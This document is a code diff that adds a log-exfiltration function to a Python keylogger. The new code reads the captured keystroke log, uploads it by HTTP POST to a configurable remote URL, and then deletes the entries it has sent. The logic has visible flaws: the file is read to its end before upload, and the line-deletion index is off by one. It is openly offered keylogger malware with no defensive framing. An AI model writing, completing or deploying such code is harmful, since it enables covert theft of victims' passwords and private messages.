@@ -1,5 +1,31 @@
 import keyboard
 import pyautogui
+import requests
+from datetime import datetime, timezone
+
+URL = 'https://0.0.0.0' # the URL/IP to which you want to send the logs to
+
+def send_log(): # send log
+    try:
+        with open('log', 'rb') as log: # open the file in read-only mode binary  
+            file_payload = {}
+            time = str(datetime.now(timezone.utc).time())[:-7].replace(':','.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
+            file_name = f'keylogger-log-{time}'
+            line_count = len(log.readlines()) # get the number of entries being sent so you know how many to delete from file later
+            file_payload = {'file':(file_name, log)} # make the payload for the file containing the file name and the file in binary
+            r = requests.post(URL, files=file_payload) # POST (send) the file
+            if not r.ok:
+                return
+            else: # assume new entries were made during process of sending and delete only entries which were already sent
+                with open('log','r+') as l:
+                    lines = l.readlines() # get all the entries into an array
+                    l.seek(0) # go to start of file
+                    l.truncate() # erase the whole file before rewriting
+                    for number, line in enumerate(lines):
+                        if number > line_count:
+                            l.write(line) # rewrite the file, writing only lines of entries which weren't already sent
+    except requests.exceptions.RequestException:
+        pass
 
 while True:
     key = keyboard.read_event() # get name of key pressed
